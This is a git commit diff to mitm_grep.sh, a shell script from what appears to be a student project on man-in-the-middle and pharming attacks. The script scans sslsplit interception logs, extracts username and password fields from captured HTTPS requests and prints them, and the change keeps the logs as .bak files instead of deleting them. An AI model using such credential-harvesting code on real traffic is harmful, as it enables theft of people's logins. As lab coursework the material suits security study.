772159af243dfc3eee2eb2fb54a0930e802370e4
Sean Wei <me@sean.taipei>
2021-04-19 23:34:48 +0800

    Add Project 2 report

--- Project2-MITM-and-Pharming/mitm_grep.sh
+++ Project2-MITM-and-Pharming/mitm_grep.sh
@@ -5,7 +5,8 @@ cd "$(dirname "$0")" || exit 1
 
 while sleep .5; do
 	find './sslsplit-log/' -name '*.log' | while read -r file; do
-		q="$(grep 'username=' "$file" | perl -pe 's#HTTP/.*?$##')"
+		mv "$file" "$file.bak"
+		q="$(grep 'username=' "$file.bak" | perl -pe 's#HTTP/.*?$##')"
 		u="$(echo "$q" | grep -oP 'username=\K[^&]*')"
 		p="$(echo "$q" | grep -oP 'password=\K[^&]*')"
 		if [ "x$u" != "x" ] && [ "x$p" != "x" ]; then
@@ -13,7 +14,6 @@ while sleep .5; do
 			echo "Username: $u"
 			echo "Password: $p"
 		fi
-		rm "$file"
 	done
 
 	if [[ ! -f 'sslsplit.pid' ]]; then
